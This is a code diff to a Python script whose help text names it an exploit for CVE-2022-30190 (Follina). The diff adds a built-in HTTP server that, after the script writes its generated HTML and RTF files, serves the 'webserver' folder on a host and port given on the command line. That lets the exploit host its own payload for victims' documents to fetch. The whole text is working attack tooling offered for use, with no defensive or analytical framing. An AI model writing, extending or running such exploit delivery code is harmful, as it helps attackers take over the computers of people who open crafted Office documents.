@@ -2,6 +2,8 @@ import sys
 import zipfile
 import os
 import base64
+import http.server
+import socketserver
 
 help_text = '''CVE-2022-30190 Follina Exploit Script
 
@@ -65,6 +67,16 @@ def main():
 		f.write(modified_html)
 
 	print("Generated HTML and RTF file")
+
+
+	class Handler(http.server.SimpleHTTPRequestHandler):
+		def __init__(self, *args, **kwargs):
+			super().__init__(*args, directory='webserver', **kwargs)
+
+
+	with socketserver.TCPServer((sys.argv[1], int(sys.argv[2])), Handler) as httpd:
+		print("serving at port", int(sys.argv[2]))
+		httpd.serve_forever()
 
 if __name__ == "__main__":
 	main()
